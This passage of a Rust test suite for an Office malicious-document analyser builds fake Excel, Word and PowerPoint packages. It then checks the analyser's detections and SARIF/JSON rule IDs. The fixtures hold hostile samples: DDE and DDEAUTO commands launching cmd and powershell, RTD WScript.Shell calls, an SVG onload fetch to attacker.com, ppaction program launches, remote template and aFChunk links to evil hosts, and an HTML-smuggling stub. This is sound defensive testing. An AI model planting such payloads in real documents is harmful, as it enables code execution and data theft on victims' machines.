        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1_xml),
        ("xl/drawings/vmlDrawing1.vml", vml_drawing),
        ("xl/drawings/_rels/drawing1.xml.rels", drawing_rels),
        ("xl/connections.xml", connections_xml),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // 1. Verify SuspiciousDrawingAction (VBA-CELL-018) for VML macro and relationship
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousDrawingAction"
                && t.description.contains("Auto_Open")),
        "Should detect VML drawing macro action: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousDrawingAction"
                && t.description.contains("stage2.exe")),
        "Should detect drawing relationship targeting executable: {threats:?}"
    );

    // 2. Verify ExternalDataConnection (VBA-CELL-019) for UNC NTLM coercion
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "ExternalDataConnection"
                && t.description.contains("NTLM credential coercion")),
        "Should detect external data connection UNC NTLM coercion: {threats:?}"
    );

    // 3. Verify C1: DDE formula de-obfuscated via dynamic array FILTER
    assert!(
        threats.iter().any(|t| t.cell_ref == "C1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c powershell.exe'!A0")),
        "C1 should resolve DDE via FILTER evaluation: {threats:?}"
    );

    // 4. Verify SARIF output contains VBA-CELL-018 and VBA-CELL-019
    let sarif = inspection_to_sarif(&inspection, "file:///test/drawing_connections.xlsm");
    assert!(
        sarif.contains("VBA-CELL-018"),
        "SARIF must contain VBA-CELL-018 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-019"),
        "SARIF must contain VBA-CELL-019 rule"
    );

    // 5. Verify JSON output contains rule_id VBA-CELL-018 and VBA-CELL-019
    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-018\""),
        "JSON missing VBA-CELL-018"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-019\""),
        "JSON missing VBA-CELL-019"
    );
}

#[test]
fn e2e_rtd_svg_and_signature_threat_inspection() {
    let project_bytes = synthesize_cfb_project(
        "TestProj",
        &[("Module1", "Sub Test()\nMsgBox 1\nEnd Sub\n", &[])],
        &[],
    );

    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Default Extension="svg" ContentType="image/svg+xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"#;

    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"#;

    let wb_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId99" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProjectSignature" Target="missing_signature.bin"/>
</Relationships>"#;

    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <definedNames>
    <definedName name="MalRTD">RTD("WScript.Shell", "", "run")</definedName>
  </definedNames>
</workbook>"#;

    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1"><f>cmd</f><v>cmd</v></c>
      <c r="B1"><f>MID(FORMULATEXT(A1), 2, 3) &amp; ".exe|'/c calc'!A0"</f></c>
      <c r="C1"><f>RTD("WScript.Shell", "", "run", "powershell -enc AAAA")</f></c>
    </row>
  </sheetData>
</worksheet>"#;

    let svg_content = r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">alert(1);</script>
  <rect width="100" height="100" onload="fetch('http://attacker.com/leak')"/>
</svg>"#;

    // Truncated / malformed signature file
    let malformed_sig = b"INVALID_ASN1_PKCS7_TEST_HEADER";

    let entries: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", root_rels.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/workbook.xml", workbook_xml.as_bytes()),
        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
        ("xl/media/image1.svg", svg_content.as_bytes()),
        ("xl/vbaProjectSignature.bin", malformed_sig),
        ("xl/vbaProject.bin", &project_bytes),
    ];

    let zip_bytes = synthesize_zip(&entries);

    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // 1. Verify RealTimeData (VBA-CELL-020) for defined name MalRTD and cell C1
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "RealTimeData" && t.cell_ref == "MalRTD"),
        "Should detect RTD in defined name MalRTD: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "RealTimeData" && t.cell_ref == "C1"),
        "Should detect RTD formula in cell C1: {threats:?}"
    );

    // 2. Verify SuspiciousSvgVector (VBA-CELL-021) for embedded SVG with script and event handler
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousSvgVector"
                && t.coordinate == "part:xl/media/image1.svg"),
        "Should detect suspicious SVG vector graphic: {threats:?}"
    );

    // 3. Verify TamperedVbaProjectSignature (VBA-CELL-022) for malformed binary and dangling rel
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "TamperedVbaProjectSignature"
                && t.coordinate == "part:xl/vbaProjectSignature.bin"),
        "Should detect malformed VBA project signature: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "TamperedVbaProjectSignature"
                && t.coordinate.contains("rId99")),
        "Should detect dangling signature relationship rId99: {threats:?}"
    );

    // 4. Verify cell B1 resolves via FORMULATEXT to dynamic DDE
    assert!(
        threats.iter().any(|t| t.cell_ref == "B1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "Cell B1 should resolve DDE through FORMULATEXT: {threats:?}"
    );

    // 5. Verify SARIF rules VBA-CELL-020, VBA-CELL-021, VBA-CELL-022
    let sarif = inspection_to_sarif(&inspection, "file:///test/rtd_svg_sig.xlsm");
    assert!(
        sarif.contains("VBA-CELL-020"),
        "SARIF must contain VBA-CELL-020 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-021"),
        "SARIF must contain VBA-CELL-021 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-022"),
        "SARIF must contain VBA-CELL-022 rule"
    );

    // 6. Verify JSON output contains rule_id VBA-CELL-020, VBA-CELL-021, VBA-CELL-022
    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-020\""),
        "JSON missing VBA-CELL-020"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-021\""),
        "JSON missing VBA-CELL-021"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-022\""),
        "JSON missing VBA-CELL-022"
    );
}

#[test]
fn e2e_word_ppt_altchunk_and_let_threat_inspection() {
    // 1. Synthesize Word document with field codes (w:fldSimple DDE, complex INCLUDETEXT, MACROBUTTON)
    let word_doc_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:fldSimple w:instr="DDEAUTO &quot;C:\\Windows\\System32\\cmd.exe&quot; &quot;/k calc.exe&quot;"/>
    </w:p>
    <w:p>
      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
      <w:r><w:instrText xml:space="preserve"> INCLUDETEXT &quot;http://attacker.com/malicious.docx&quot; </w:instrText></w:r>
      <w:r><w:fldChar w:fldCharType="end"/></w:r>
    </w:p>
    <w:p>
      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
      <w:r><w:instrText>MACROBUTTON </w:instrText></w:r>
      <w:r><w:instrText>AutoOpen </w:instrText></w:r>
      <w:r><w:instrText>Double Click To Run</w:instrText></w:r>
      <w:r><w:fldChar w:fldCharType="end"/></w:r>
    </w:p>
  </w:body>
</w:document>"#;

    // 2. Synthesize PowerPoint slide with action settings and mouse-over hover trigger
    let ppt_slide_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
       xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
       xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <p:cSld>
    <p:spTree>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Shape1">
            <a:hlinkClick r:id="rId1" action="ppaction://program?param=powershell.exe -w hidden"/>
            <a:hlinkHover r:id="rId2" action="ppaction://program?param=cmd.exe"/>
          </p:cNvPr>
        </p:nvSpPr>
      </p:sp>
    </p:spTree>
  </p:cSld>
</p:sld>"#;

    // 3. Synthesize Word document rels with external aFChunk relationship
    let word_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rIdAlt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="http://malicious-server.com/exploit.rtf" TargetMode="External"/>
</Relationships>"#;

    // 4. Synthesize internal afchunk part containing HTML smuggling payload
    let afchunk_payload = b"<html><body><script>document.location='data:text/html;base64,TVqQAAMAAAAEAAAA...'</script></body></html>";

    // 5. Synthesize Excel worksheet with LET and ENCODEURL formula de-obfuscation
    let sheet_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="str">
        <f>LET(p1, "cmd", p2, ".exe|'/c calc'!A0", CONCAT(p1, p2))</f>
        <v>cmd.exe|'/c calc'!A0</v>
      </c>
      <c r="B1" t="str">
        <f>LET(u, "https://evil.com/payload.exe", ENCODEURL(u))</f>
        <v>https%3A%2F%2Fevil.com%2Fpayload.exe</v>
      </c>
    </row>
  </sheetData>
</worksheet>"#;

    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>"#;

    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Default Extension="dat" ContentType="application/octet-stream"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"#;

    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"#;

    let wb_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>"#;

    let project_bytes = synthesize_cfb_project(
        "VBAProject",
        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
        &[],
    );

    let entries: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", root_rels.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("word/document.xml", word_doc_xml),
        ("word/_rels/document.xml.rels", word_rels),
        ("word/afchunk1.dat", afchunk_payload),
        ("ppt/slides/slide1.xml", ppt_slide_xml),
        ("xl/worksheets/sheet1.xml", sheet_xml),
        ("xl/workbook.xml", workbook_xml),
        ("xl/vbaProject.bin", &project_bytes),
    ];

    let zip_bytes = synthesize_zip(&entries);
    let options = AnalysisOptions {
        limits: Limits::default(),
        host_profile: HostProfile::Excel,
        ..Default::default()
    };

    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // 1. Verify WordFieldCode (VBA-CELL-023)
    assert!(
        threats.iter().any(|t| t.threat_kind == "WordFieldCode"
            && t.severity == "Critical"
            && t.description.contains("DDEAUTO")),
        "Should detect Word DDEAUTO field code: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "WordFieldCode" && t.description.contains("INCLUDETEXT")),
        "Should detect Word INCLUDETEXT field code: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "WordFieldCode" && t.description.contains("MACROBUTTON")),
        "Should detect Word MACROBUTTON field code: {threats:?}"
    );

    // 2. Verify PowerPointSlideAction (VBA-CELL-024)
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "PowerPointSlideAction"
                && t.coordinate == "part:ppt/slides/slide1.xml:action:ProgramLaunch"),
        "Should detect PowerPoint program launch action: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "PowerPointSlideAction"
                && t.coordinate == "part:ppt/slides/slide1.xml:action:MouseHoverTrigger"),
        "Should detect PowerPoint mouse-over hover trigger: {threats:?}"
    );

    // 3. Verify SuspiciousAltChunk (VBA-CELL-025)
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousAltChunk" && t.coordinate.contains("rIdAlt")),
        "Should detect external AltChunk relationship: {threats:?}"
    );
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousAltChunk"
                && t.coordinate == "part:word/afchunk1.dat"),
        "Should detect internal AltChunk HTML smuggling payload: {threats:?}"
    );

    // 4. Verify Cell A1 resolves DDE via LET formula de-obfuscation
    assert!(
        threats.iter().any(|t| t.cell_ref == "A1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "Cell A1 should resolve DDE through LET evaluation: {threats:?}"
    );

    // 5. Verify SARIF rules VBA-CELL-023, VBA-CELL-024, VBA-CELL-025
    let sarif = inspection_to_sarif(&inspection, "file:///test/word_ppt_altchunk.docm");
    assert!(
        sarif.contains("VBA-CELL-023"),
        "SARIF must contain VBA-CELL-023 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-024"),
        "SARIF must contain VBA-CELL-024 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-025"),
        "SARIF must contain VBA-CELL-025 rule"
    );

    // 6. Verify JSON output contains rule_id VBA-CELL-023, VBA-CELL-024, VBA-CELL-025
    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-023\""),
        "JSON missing VBA-CELL-023"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-024\""),
        "JSON missing VBA-CELL-024"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-025\""),
        "JSON missing VBA-CELL-025"
    );
}
